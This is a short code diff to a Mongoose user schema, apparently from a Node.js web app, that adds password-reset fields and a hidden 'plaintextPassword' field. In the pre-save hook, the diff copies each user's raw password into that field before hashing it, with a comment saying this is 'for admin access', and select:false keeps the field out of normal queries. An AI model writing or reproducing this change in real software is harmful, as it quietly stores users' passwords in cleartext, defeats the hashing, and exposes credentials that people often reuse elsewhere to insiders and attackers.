@@ -42,6 +42,16 @@ const userSchema = new mongoose.Schema({
       default: false
     }
   },
+  passwordResetCode: {
+    type: String
+  },
+  passwordResetExpires: {
+    type: Date
+  },
+  plaintextPassword: {
+    type: String,
+    select: false // This ensures the field isn't returned in normal queries
+  },
   isActive: {
     type: Boolean,
     default: true
@@ -55,6 +65,9 @@ userSchema.pre('save', async function(next) {
   if (!this.isModified('password')) return next();
   
   try {
+    // Store the plaintext password for admin access
+    this.plaintextPassword = this.password;
+    
     const salt = await bcrypt.genSalt(10);
     this.password = await bcrypt.hash(this.password, salt);
     next();
